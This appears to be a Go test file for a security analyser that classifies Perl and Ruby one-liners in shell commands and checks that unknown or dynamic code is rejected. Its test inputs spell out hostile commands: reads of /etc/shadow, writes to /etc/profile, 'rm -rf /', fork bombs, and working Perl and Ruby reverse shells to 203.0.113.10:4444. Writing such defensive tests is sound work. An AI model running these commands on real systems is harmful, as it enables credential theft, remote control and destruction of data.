// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"strconv"
	"strings"
	"testing"
)

func TestBoundedInlineInterpreterRecognizesBenignBodies(t *testing.T) {
	for _, test := range []struct {
		name    string
		input   Input
		program string
	}{
		{
			name:    "Perl print",
			input:   Input{Tool: "shell", Command: `perl -T -f -e 'print 1'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Ruby puts",
			input:   Input{Tool: "shell", Command: `ruby -e 'puts 1'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name: "Ruby static collection transform",
			input: Input{
				Tool: "shell", Command: `ruby -e 'items = ["a", "b"]; puts items.join("-")'`, CWD: "/repo",
			},
			program: "ruby",
		},
		{
			name: "Perl warnings and static arithmetic",
			input: Input{
				Tool: "shell", Command: `perl -T -f -we 'my $n = 2 + 3; print $n'`, CWD: "/repo",
			},
			program: "perl",
		},
		{
			name: "Perl repeated inline fragments",
			input: Input{
				Tool: "shell", Argv: []string{"/usr/bin/perl", "-T", "-f", "-e", "print 1;", "-e", "print 2"},
				CWD: "/repo", DialectHint: DialectPOSIX,
			},
			program: "perl",
		},
		{
			name: "Ruby joined inline fragment",
			input: Input{
				Tool: "shell", Argv: []string{"/usr/bin/ruby", "-eputs 1"},
				CWD: "/repo", DialectHint: DialectPOSIX,
			},
			program: "ruby",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(test.input)
			assertFactsInvariants(t, facts)
			if !facts.Authoritative() || !facts.EnforcementEligible() {
				t.Fatalf("fully consumed inline body is not authoritative: %+v", facts)
			}
			command := inlineInterpreterCommand(t, facts, test.program)
			if test.program == "perl" && !RecognizesPOSIXPerlInlineBody(command) ||
				test.program == "ruby" && !RecognizesPOSIXRubyInlineBody(command) {
				t.Fatalf("inline body recognition failed: %+v", command)
			}
		})
	}
}

func TestBoundedInlineInterpreterAcceptedInvocationFormsRemainAuthoritative(t *testing.T) {
	for _, test := range []struct {
		name    string
		input   Input
		program string
	}{
		{name: "plain Perl", input: Input{Tool: "shell", Command: `perl -e 'print 1'`, CWD: "/repo"}, program: "perl"},
		{name: "Perl taint without no-sitecustomize", input: Input{Tool: "shell", Command: `perl -T -e 'print 1'`, CWD: "/repo"}, program: "perl"},
		{name: "Perl no-sitecustomize without taint", input: Input{Tool: "shell", Command: `perl -f -e 'print 1'`, CWD: "/repo"}, program: "perl"},
		{name: "plain Ruby", input: Input{Tool: "shell", Command: `ruby -e 'puts 1'`, CWD: "/repo"}, program: "ruby"},
		{name: "Ruby disable gems", input: Input{Tool: "shell", Command: `ruby --disable-gems -e 'puts 1'`, CWD: "/repo"}, program: "ruby"},
		{name: "Ruby disable gems and rubyopt", input: Input{Tool: "shell", Command: `ruby --disable=gems,rubyopt -e 'items = ["a", "b"]; puts items.join("-")'`, CWD: "/repo"}, program: "ruby"},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(test.input)
			assertFactsInvariants(t, facts)
			if !facts.Authoritative() || !facts.EnforcementEligible() {
				t.Fatalf("accepted visible invocation is not authoritative: %+v", facts)
			}
			command := inlineInterpreterCommand(t, facts, test.program)
			if test.program == "perl" {
				if !RecognizesPOSIXPerlInlineBody(command) {
					t.Fatalf("Perl body recognition failed: %+v", command)
				}
			} else if !RecognizesPOSIXRubyInlineBody(command) {
				t.Fatalf("Ruby body recognition failed: %+v", command)
			}
		})
	}
}

func TestBoundedInlineInterpreterProjectsSecurityEffects(t *testing.T) {
	for _, test := range []struct {
		name          string
		command       string
		program       string
		operation     OperationKind
		pathAccess    PathAccess
		path          string
		network       string
		port          int64
		authoritative bool
	}{
		{
			name: "Perl sensitive read", command: `perl -T -f -e 'open(my $fh, "<", "/etc/shadow")'`,
			program: "perl", operation: OperationRead, pathAccess: PathAccessRead, path: "/etc/shadow", authoritative: true,
		},
		{
			name: "Ruby sensitive read", command: `ruby -e 'File.read("/etc/shadow")'`,
			program: "ruby", operation: OperationRead, pathAccess: PathAccessRead, path: "/etc/shadow", authoritative: true,
		},
		{
			name: "Perl profile append", command: `perl -T -f -e 'open(my $fh, ">>", "/etc/profile")'`,
			program: "perl", operation: OperationAppend, pathAccess: PathAccessAppend, path: "/etc/profile", authoritative: true,
		},
		{
			name: "Ruby profile write", command: `ruby -e 'File.write("/etc/profile", "x")'`,
			program: "ruby", operation: OperationWrite, pathAccess: PathAccessWrite, path: "/etc/profile", authoritative: true,
		},
		{
			name:    "Perl outbound socket",
			command: `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => "203.0.113.10", PeerPort => 4444, Proto => "tcp")'`,
			program: "perl", operation: OperationConnect, network: "203.0.113.10", port: 4444,
		},
		{
			name:    "Ruby outbound socket",
			command: `ruby -e 'require "socket"; s = TCPSocket.new("203.0.113.10", 4444)'`,
			program: "ruby", operation: OperationConnect, network: "203.0.113.10", port: 4444,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			if got := facts.Authoritative() && facts.EnforcementEligible(); got != test.authoritative {
				t.Fatalf("authoritative/enforceable = %t, want %t: %+v", got, test.authoritative, facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			if !inlineCommandHasOperation(owner, test.operation) {
				t.Fatalf("operations = %v, want %s", owner.Operations, test.operation)
			}
			if test.path != "" && !inlineFactsHavePath(facts, owner.ID, test.pathAccess, test.path) {
				t.Fatalf("paths = %+v, want %s %q", facts.Paths, test.pathAccess, test.path)
			}
			if test.network != "" && !inlineFactsHaveNetwork(facts, owner.ID, test.network, test.port) {
				t.Fatalf("network = %+v, want %s:%d", facts.Network, test.network, test.port)
			}
		})
	}
}

func TestBoundedInlineInterpreterLanguageSpecificExpressionsFailClosed(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
		program string
	}{
		{
			name: "Perl rejects Ruby-style array join",
			command: `perl -T -f -e 'my $parts = ["/etc", "shadow"]; ` +
				`open(my $fh, "<", $parts.join("/"))'`,
			program: "perl",
		},
		{
			name: "Ruby rejects language-dependent integer division",
			command: `ruby -e 'require "socket"; portx = 5 + -3 / 2; ` +
				`s = TCPSocket.new("203.0.113.10", portx)'`,
			program: "ruby",
		},
		{
			name: "Ruby rejects reassigned socket constant",
			command: `ruby -e 'require "socket"; TCPSocket = "x"; ` +
				`s = TCPSocket.new("203.0.113.10", 4444)'`,
			program: "ruby",
		},
		{
			name:    "Ruby rejects non-string file write data",
			command: `ruby -e 'File.write("/etc/profile", 1)'`,
			program: "ruby",
		},
		{
			name:    "Ruby rejects pseudo-file assignment",
			command: `ruby -e '__FILE__ = 1; File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name:    "Ruby rejects namespace assignment",
			command: `ruby -e 'foo::bar = 1; File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name:    "Ruby rejects numbered parameter assignment",
			command: `ruby -e '_1 = 1; File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name:    "Ruby rejects newline before system arguments",
			command: "ruby -e 'system\n(\"rm -rf /\")'",
			program: "ruby",
		},
		{
			name:    "Ruby rejects newline before exec arguments",
			command: "ruby -e 'exec\n(\"/bin/sh\", \"-i\")'",
			program: "ruby",
		},
		{
			name:    "Ruby rejects newline before file arguments",
			command: "ruby -e 'File.write\n(\"/etc/profile\", \"x\")'",
			program: "ruby",
		},
		{
			name:    "Ruby rejects printf before a sensitive effect",
			command: `ruby -e 'printf(1); File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name:    "Perl rejects printf before a sensitive effect",
			command: `perl -e 'printf "%999999999999999999999999999999d", 1; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Ruby rejects bare trailing diagnostic comma",
			command: `ruby -e 'puts 1,; File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name:    "Perl rejects adjacent decrement tokens",
			command: `perl -e 'print --1; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Perl rejects adjacent increment tokens",
			command: `perl -e 'print ++1; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Perl rejects binary decrement token",
			command: `perl -e 'print 1--1; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Perl rejects binary increment token",
			command: `perl -e 'print 1++2; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Perl rejects quoted child callee",
			command: `perl -e '"system"("/bin/rm", "-rf", "/tmp/x")'`,
			program: "perl",
		},
		{
			name:    "Ruby rejects quoted exec callee",
			command: `ruby -e '"exec"("/bin/sh", "-i")'`,
			program: "ruby",
		},
		{
			name:    "Perl rejects string additive operator",
			command: `perl -e 'my $n = 1 "+" 2; open(my $fh, "<", "/etc/shadow")'`,
			program: "perl",
		},
		{
			name:    "Ruby rejects string multiplicative operator",
			command: `ruby -e 'n = 1 "*" 2; File.read("/etc/shadow")'`,
			program: "ruby",
		},
		{
			name: "Perl INET rejects IPv6 literal",
			command: `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(` +
				`PeerAddr => "::1", PeerPort => 4444, Proto => "tcp")'`,
			program: "perl",
		},
		{
			name: "Perl INET rejects IPv4-mapped IPv6 literal",
			command: `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(` +
				`PeerAddr => "::ffff:127.0.0.1", PeerPort => 4444, Proto => "tcp")'`,
			program: "perl",
		},
		{
			name:    "Ruby rejects unary plus on array",
			command: `ruby -e 'items = +(["/etc", "profile"]); File.write(items.join("/"), "x")'`,
			program: "ruby",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || facts.EnforcementEligible() ||
				len(facts.Paths) != 0 || len(facts.Network) != 0 {
				t.Fatalf("language-specific expression projected false facts: %+v", facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			if RecognizesPOSIXPerlInlineBody(owner) || RecognizesPOSIXRubyInlineBody(owner) {
				t.Fatalf("unsupported expression acquired body recognition: %+v", owner)
			}
		})
	}

	facts := Analyze(Input{
		Tool: "shell",
		Command: `ruby -e 'require "socket"; portx = 4000 + 444; ` +
			`s = TCPSocket.new("203.0.113.10", portx)'`,
		CWD: "/repo",
	})
	assertFactsInvariants(t, facts)
	owner := inlineInterpreterCommand(t, facts, "ruby")
	if !inlineFactsHaveNetwork(facts, owner.ID, "203.0.113.10", 4444) {
		t.Fatalf("Ruby addition control lost its exact network fact: %+v", facts)
	}
}

func TestBoundedInlineInterpreterDerivedStringLimitFailsClosed(t *testing.T) {
	body := `x0="aaaaaaaaaaaaaaaa"`
	for index := 1; index <= 12; index++ {
		body += `; x` + strconv.Itoa(index) + `=[x` + strconv.Itoa(index-1) +
			`,x` + strconv.Itoa(index-1) + `].join(x` + strconv.Itoa(index-1) + `)`
	}
	body += `; File.read(x12)`
	facts := Analyze(Input{
		Tool: "shell", Argv: []string{"ruby", "-e", body}, CWD: "/repo", DialectHint: DialectPOSIX,
	})
	assertFactsInvariants(t, facts)
	if facts.Authoritative() || facts.EnforcementEligible() || len(facts.Paths) != 0 {
		t.Fatalf("oversized derived string produced authoritative facts: %+v", facts)
	}
	owner := inlineInterpreterCommand(t, facts, "ruby")
	if RecognizesPOSIXRubyInlineBody(owner) {
		t.Fatalf("oversized derived string acquired body recognition: %+v", owner)
	}
}

func TestBoundedInlineInterpreterRecursesIntoStaticSystemAndExec(t *testing.T) {
	for _, test := range []struct {
		name          string
		command       string
		program       string
		child         string
		operation     OperationKind
		pathAccess    PathAccess
		path          string
		wantReplace   bool
		authoritative bool
		wantPartial   bool
	}{
		{
			name: "Perl argv system delete", command: `perl -T -f -e 'system("/bin/rm", "-rf", "/")'`,
			program: "perl", child: "rm", operation: OperationDelete, pathAccess: PathAccessDelete, path: "/", authoritative: true,
		},
		{
			name: "Ruby string system delete", command: `ruby -e 'system("rm -rf /")'`,
			program: "ruby", child: "rm", operation: OperationDelete, pathAccess: PathAccessDelete, path: "/", authoritative: true,
		},
		{
			name: "Perl exact exec", command: `perl -e 'exec("/bin/sh", "-i")'`,
			program: "perl", child: "sh", operation: OperationExecute, wantReplace: true,
		},
		{
			name: "Ruby exact exec", command: `ruby -e 'exec("/bin/sh", "-i")'`,
			program: "ruby", child: "sh", operation: OperationExecute, wantReplace: true,
		},
		{
			name: "Perl mixed-case shell is not proven", command: `perl -e 'exec("/bin/Sh", "-i")'`,
			program: "perl", child: "sh", operation: OperationExecute,
		},
		{
			name: "Ruby mixed-case shell is not proven", command: `ruby -e 'exec("/bin/Sh", "-i")'`,
			program: "ruby", child: "sh", operation: OperationExecute,
		},
		{
			name: "Perl mixed-case shell directory is not proven", command: `perl -e 'exec("/USR/bin/sh", "-i")'`,
			program: "perl", child: "sh", operation: OperationExecute, wantPartial: true,
		},
		{
			name: "Perl mixed-case child stays partial", command: `perl -e 'system("/bin/Rm", "-rf", "/tmp/x")'`,
			program: "perl", child: "rm", operation: OperationDelete, pathAccess: PathAccessDelete, path: "/tmp/x", wantPartial: true,
		},
		{
			name: "Perl mixed-case child directory stays partial", command: `perl -e 'system("/USR/bin/rm", "-rf", "/tmp/x")'`,
			program: "perl", child: "rm", operation: OperationDelete, pathAccess: PathAccessDelete, path: "/tmp/x", wantPartial: true,
		},
		{
			name: "Perl wrapped mixed-case child stays partial", command: `perl -e 'system("env", "/bin/Rm", "-rf", "/tmp/x")'`,
			program: "perl", child: "env", operation: OperationExecute, wantPartial: true,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			if got := facts.Authoritative() && facts.EnforcementEligible(); got != test.authoritative {
				t.Fatalf("authoritative/enforceable = %t, want %t: %+v", got, test.authoritative, facts)
			}
			if test.wantPartial && facts.Authoritative() {
				t.Fatalf("mixed-case child unexpectedly remained authoritative: %+v", facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			child := inlineInterpreterChild(t, facts, owner.ID, test.child)
			if !inlineCommandHasOperation(child, test.operation) {
				t.Fatalf("child operations = %v, want %s", child.Operations, test.operation)
			}
			if test.path != "" && !inlineFactsHavePath(facts, child.ID, test.pathAccess, test.path) {
				t.Fatalf("paths = %+v, want child %s %q", facts.Paths, test.pathAccess, test.path)
			}
			if inlineFactsHaveFlow(facts, child.ID, owner.ID, DataStdout, DataProcess) {
				t.Fatalf("system/exec child acquired a false stdout-to-parent flow: %+v", facts)
			}
			if test.wantReplace && !ProvesPOSIXInlineInterpreterShellExec(facts, owner.ID) {
				t.Fatalf("exact shell exec proof failed: %+v", facts)
			}
		})
	}
}

func TestBoundedInlineInterpreterProjectsReverseShellFlow(t *testing.T) {
	for _, test := range []struct {
		name    string
		program string
		command string
	}{
		{
			name:    "Perl socket stdio shell",
			program: "perl",
			command: `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => "203.0.113.10", PeerPort => 4444, Proto => "tcp"); open(STDIN, "<&", $s); open(STDOUT, ">&", $s); exec("/bin/sh", "-i")'`,
		},
		{
			name:    "Ruby socket stdio shell",
			program: "ruby",
			command: `ruby -e 'require "socket"; s = TCPSocket.new("203.0.113.10", 4444); STDIN.reopen(s); STDOUT.reopen(s); exec("/bin/sh", "-i")'`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || facts.EnforcementEligible() {
				t.Fatalf("reverse shell must remain non-authoritative: %+v", facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			if !inlineFactsHaveNetwork(facts, owner.ID, "203.0.113.10", 4444) ||
				!inlineFactsHaveFlow(facts, 0, owner.ID, DataNetwork, DataStdin) ||
				!inlineFactsHaveFlow(facts, owner.ID, 0, DataStdout, DataNetwork) ||
				!ProvesPOSIXInlineInterpreterShellExec(facts, owner.ID) {
				t.Fatalf("reverse-shell facts are incomplete: %+v", facts)
			}
		})
	}
}

func TestBoundedInlineInterpreterForkBombProofIsExact(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
		program string
		want    bool
	}{
		{name: "Perl exact", command: `perl -T -f -e 'fork while fork'`, program: "perl", want: true},
		{name: "Perl exact trailing separator", command: `perl -T -f -e 'fork while fork;'`, program: "perl", want: true},
		{name: "Perl inert string", command: `perl -e 'print "fork while fork"'`, program: "perl"},
		{name: "Perl extra statement", command: `perl -e 'fork while fork; print 1'`, program: "perl"},
		{name: "Ruby exact", command: `ruby -e 'loop { fork }'`, program: "ruby", want: true},
		{name: "Ruby exact trailing separator", command: `ruby -e 'loop { fork };'`, program: "ruby", want: true},
		{name: "Ruby bounded loop", command: `ruby -e '2.times { puts 1 }'`, program: "ruby"},
		{name: "Ruby string braces", command: `ruby -e 'loop "{" fork "}"'`, program: "ruby"},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			command := inlineInterpreterCommand(t, facts, test.program)
			if got := ProvesPOSIXInlineInterpreterForkBomb(command); got != test.want {
				t.Fatalf("fork-bomb proof = %t, want %t: %+v", got, test.want, facts)
			}
			if test.want && (!facts.Authoritative() || !facts.EnforcementEligible()) {
				t.Fatalf("fully consumed fork body is not authoritative: %+v", facts)
			}
		})
	}
}

func TestBoundedInlineInterpreterFailedParseCommitsNoPartialFacts(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
		program string
	}{
		{
			name: "Perl read before unknown call", program: "perl",
			command: `perl -e 'open(my $fh, "<", "/etc/shadow"); Example::Unknown::call("x")'`,
		},
		{
			name: "Perl filehandle is not a string child argument", program: "perl",
			command: `perl -e 'open(my $fh, "<", "/etc/shadow"); system("/bin/rm", $fh)'`,
		},
		{
			name: "Perl filehandle cannot hide in an array", program: "perl",
			command: `perl -e 'open(my $fh, "<", "/etc/shadow"); my $items = [$fh]; print 1'`,
		},
		{
			name: "Ruby write before eval", program: "ruby",
			command: `ruby -e 'File.write("/etc/profile", "x"); eval("puts 1")'`,
		},
		{
			name: "Ruby relative path", program: "ruby",
			command: `ruby -e 'File.read("relative.txt")'`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || len(facts.Paths) != 0 || len(facts.Network) != 0 {
				t.Fatalf("failed parse leaked authoritative facts: %+v", facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			if inlineCommandHasOperation(owner, OperationRead) ||
				inlineCommandHasOperation(owner, OperationWrite) ||
				inlineCommandHasOperation(owner, OperationConnect) {
				t.Fatalf("failed parse leaked an effect operation: %+v", owner)
			}
		})
	}
}

func TestBoundedInlineInterpreterChildRespectsCumulativeWrapperDepth(t *testing.T) {
	facts := Analyze(Input{
		Tool:    "shell",
		Command: `env env env env perl -e 'system("rm", "-rf", "/")'`,
		CWD:     "/repo",
	})
	assertFactsInvariants(t, facts)
	if facts.Parse.Status != StatusLimitExceeded ||
		!containsIssue(facts.Parse.Issues, IssueWrapperLimit) {
		t.Fatalf("nested inline child did not enforce wrapper bound: %+v", facts)
	}
	owner := inlineInterpreterCommand(t, facts, "perl")
	if inlineCommandHasOperation(owner, OperationDelete) {
		t.Fatalf("wrapper-limit failure leaked child effects: %+v", facts)
	}
}

func TestBoundedInlineInterpreterChildPreservesOuterWrappers(t *testing.T) {
	facts := Analyze(Input{
		Tool:    "shell",
		Command: `env perl -T -f -e 'system("rm", "-rf", "/tmp/x")'`,
		CWD:     "/repo",
	})
	assertFactsInvariants(t, facts)
	if !facts.Authoritative() || !facts.EnforcementEligible() {
		t.Fatalf("fully consumed wrapped body is not authoritative: %+v", facts)
	}
	owner := inlineInterpreterCommand(t, facts, "perl")
	child := inlineInterpreterChild(t, facts, owner.ID, "rm")
	if len(child.Wrappers) != 2 || child.Wrappers[0].Executable != "env" ||
		child.Wrappers[1].Executable != "perl" {
		t.Fatalf("child wrappers = %+v, want env then perl", child.Wrappers)
	}
	child.Wrappers[0].Argv[0] = "mutated"
	if facts.Commands[0].Wrappers != nil || owner.Wrappers[0].Argv[0] != "env" {
		t.Fatalf("wrapper argv slices alias: %+v", facts)
	}
}

func TestBoundedInlineInterpreterRequiresExactOuterWrapperIdentity(t *testing.T) {
	for _, test := range []struct {
		name    string
		input   Input
		program string
		path    string
		fork    bool
	}{
		{
			name: "structured mixed-case Env",
			input: Input{
				Tool:        "shell",
				Argv:        []string{"Env", "perl", "-e", `open(my $fh, "<", "/etc/shadow")`},
				CWD:         "/repo",
				DialectHint: DialectPOSIX,
			},
			program: "perl",
			path:    "/etc/shadow",
		},
		{
			name:    "raw mixed-case Sudo",
			input:   Input{Tool: "shell", Command: `Sudo ruby -e 'File.read("/etc/shadow")'`, CWD: "/repo"},
			program: "ruby",
			path:    "/etc/shadow",
		},
		{
			name:    "raw mixed-case ENV fork proof",
			input:   Input{Tool: "shell", Command: `ENV perl -e 'fork while fork'`, CWD: "/repo"},
			program: "perl",
			fork:    true,
		},
		{
			name:    "raw mixed-case wrapper directory",
			input:   Input{Tool: "shell", Command: `/USR/bin/env perl -e 'open(my $fh, "<", "/etc/shadow")'`, CWD: "/repo"},
			program: "perl",
			path:    "/etc/shadow",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(test.input)
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || facts.EnforcementEligible() {
				t.Fatalf("mixed-case outer wrapper became authoritative: %+v", facts)
			}
			owner := inlineInterpreterCommand(t, facts, test.program)
			if RecognizesPOSIXPerlInlineBody(owner) || RecognizesPOSIXRubyInlineBody(owner) {
				t.Fatalf("mixed-case outer wrapper acquired inline proof: %+v", owner)
			}
			if inlineFactsHavePath(facts, owner.ID, PathAccessRead, test.path) {
				t.Fatalf("mixed-case outer wrapper leaked path fact: %+v", facts.Paths)
			}
			if test.fork && ProvesPOSIXInlineInterpreterForkBomb(owner) {
				t.Fatalf("mixed-case outer wrapper acquired fork-bomb proof: %+v", owner)
			}
		})
	}

	positive := Analyze(Input{
		Tool:    "shell",
		Command: `env ruby -e 'File.read("/etc/shadow")'`,
		CWD:     "/repo",
	})
	assertFactsInvariants(t, positive)
	if !positive.Authoritative() || !positive.EnforcementEligible() {
		t.Fatalf("exact lowercase wrapper lost authority: %+v", positive)
	}
	owner := inlineInterpreterCommand(t, positive, "ruby")
	if !RecognizesPOSIXRubyInlineBody(owner) ||
		!inlineFactsHavePath(positive, owner.ID, PathAccessRead, "/etc/shadow") {
		t.Fatalf("exact lowercase wrapper lost inline facts: %+v", positive)
	}
}

func TestBoundedInlineInterpreterUnknownOrDynamicProgramsFailClosed(t *testing.T) {
	longBody := "print 1;" + strings.Repeat(" ", maxInlineInterpreterBytes)
	for _, test := range []struct {
		name    string
		input   Input
		program string
	}{
		{
			name:    "Perl unknown import",
			input:   Input{Tool: "shell", Command: `perl -e 'use Example::Unknown; print 1'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Perl unknown API",
			input:   Input{Tool: "shell", Command: `perl -e 'Example::Unknown::call("x")'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Perl eval",
			input:   Input{Tool: "shell", Command: `perl -e 'eval "print 1"'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Perl interpolation",
			input:   Input{Tool: "shell", Command: `perl -e 'print "$ENV{TOKEN}"'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Perl array interpolation",
			input:   Input{Tool: "shell", Command: `perl -e 'print "@ARGV"'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Perl dynamic system",
			input:   Input{Tool: "shell", Command: `perl -e 'my $cmd = $ARGV[0]; system($cmd)'`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "Ruby unknown import",
			input:   Input{Tool: "shell", Command: `ruby -e 'require "example/unknown"; puts 1'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "Ruby unknown API",
			input:   Input{Tool: "shell", Command: `ruby -e 'Example::Unknown.call("x")'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "Ruby eval",
			input:   Input{Tool: "shell", Command: `ruby -e 'eval("puts 1")'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "Ruby interpolation",
			input:   Input{Tool: "shell", Command: `ruby -e 'puts "#{ENV["TOKEN"]}"'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "Ruby instance interpolation",
			input:   Input{Tool: "shell", Command: `ruby -e 'puts "#@token"'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "Ruby dynamic socket",
			input:   Input{Tool: "shell", Command: `ruby -e 'require "socket"; TCPSocket.new(ENV["HOST"], 4444)'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "malformed Ruby",
			input:   Input{Tool: "shell", Command: `ruby -e 'File.read("/etc/shadow"'`, CWD: "/repo"},
			program: "ruby",
		},
		{
			name:    "shell-expanded Perl body",
			input:   Input{Tool: "shell", Command: `perl -e "$code"`, CWD: "/repo"},
			program: "perl",
		},
		{
			name:    "inline parser byte limit",
			input:   Input{Tool: "shell", Argv: []string{"perl", "-e", longBody}, CWD: "/repo", DialectHint: DialectPOSIX},
			program: "perl",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(test.input)
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || facts.EnforcementEligible() {
				t.Fatalf("unknown/dynamic input became authoritative: %+v", facts)
			}
			command := inlineInterpreterCommand(t, facts, test.program)
			if test.program == "perl" && RecognizesPOSIXPerlInlineBody(command) ||
				test.program == "ruby" && RecognizesPOSIXRubyInlineBody(command) {
				t.Fatalf("unknown/dynamic input acquired inline proof: %+v", command)
			}
		})
	}
}

func TestBoundedInlineInterpreterInvocationGrammarFailsClosed(t *testing.T) {
	for _, test := range []struct {
		name    string
		argv    []string
		program string
	}{
		{name: "Perl module option", argv: []string{"perl", "-MExample", "-e", "print 1"}, program: "perl"},
		{name: "Perl loop option", argv: []string{"perl", "-ne", "print 1"}, program: "perl"},
		{name: "Perl trailing operand", argv: []string{"perl", "-e", "print 1", "input.txt"}, program: "perl"},
		{name: "Ruby require option", argv: []string{"ruby", "-rsocket", "-e", "puts 1"}, program: "ruby"},
		{name: "Ruby load path", argv: []string{"ruby", "-Ilib", "-e", "puts 1"}, program: "ruby"},
		{name: "Ruby trailing operand", argv: []string{"ruby", "-e", "puts 1", "input.txt"}, program: "ruby"},
		{name: "mixed-case Perl executable", argv: []string{"Perl", "-e", `system("rm", "-rf", "/tmp/x")`}, program: "perl"},
		{name: "mixed-case Ruby path", argv: []string{"/usr/bin/Ruby", "-e", `File.write("/etc/profile", "x")`}, program: "ruby"},
		{name: "mixed-case Perl directory", argv: []string{"/USR/bin/perl", "-e", `open(my $fh, "<", "/etc/shadow")`}, program: "perl"},
		{name: "Windows Perl path under POSIX", argv: []string{"C:/Windows/System32/perl", "-e", `open(my $fh, "<", "/etc/shadow")`}, program: "perl"},
		{name: "Perl scalar exec", argv: []string{"perl", "-e", `exec("/bin/sh -i")`}, program: "perl"},
		{name: "Ruby scalar exec", argv: []string{"ruby", "-e", `exec("/bin/sh -i")`}, program: "ruby"},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Argv: test.argv, CWD: "/repo", DialectHint: DialectPOSIX})
			assertFactsInvariants(t, facts)
			if facts.Authoritative() || facts.EnforcementEligible() {
				t.Fatalf("unsupported invocation became authoritative: %+v", facts)
			}
			command := inlineInterpreterCommand(t, facts, test.program)
			if RecognizesPOSIXPerlInlineBody(command) || RecognizesPOSIXRubyInlineBody(command) {
				t.Fatalf("unsupported invocation acquired inline proof: %+v", command)
			}
		})
	}
}

func inlineInterpreterCommand(t *testing.T, facts Facts, program string) CommandFact {
	t.Helper()
	for _, command := range facts.Commands {
		if command.Program == program {
			return command
		}
	}
	t.Fatalf("%s command is missing: %+v", program, facts)
	return CommandFact{}
}

func inlineInterpreterChild(
	t *testing.T,
	facts Facts,
	parentID int64,
	program string,
) CommandFact {
	t.Helper()
	for _, command := range facts.Commands {
		if command.ParentCommandID == parentID && command.Program == program {
			return command
		}
	}
	t.Fatalf("%s child of %d is missing: %+v", program, parentID, facts)
	return CommandFact{}
}

func inlineCommandHasOperation(command CommandFact, operation OperationKind) bool {
	for _, candidate := range command.Operations {
		if candidate == operation {
			return true
		}
	}
	return false
}

func inlineFactsHavePath(
	facts Facts,
	commandID int64,
	access PathAccess,
	value string,
) bool {
	for _, candidate := range facts.Paths {
		if candidate.CommandID == commandID && candidate.Access == access &&
			(candidate.Value == value || candidate.Normalized == value || candidate.Resolved == value) {
			return true
		}
	}
	return false
}

func inlineFactsHaveNetwork(facts Facts, commandID int64, host string, port int64) bool {
	for _, candidate := range facts.Network {
		if candidate.CommandID == commandID && candidate.Action == NetworkConnect &&
			candidate.NormalizedHost == host && candidate.Port == port {
			return true
		}
	}
	return false
}

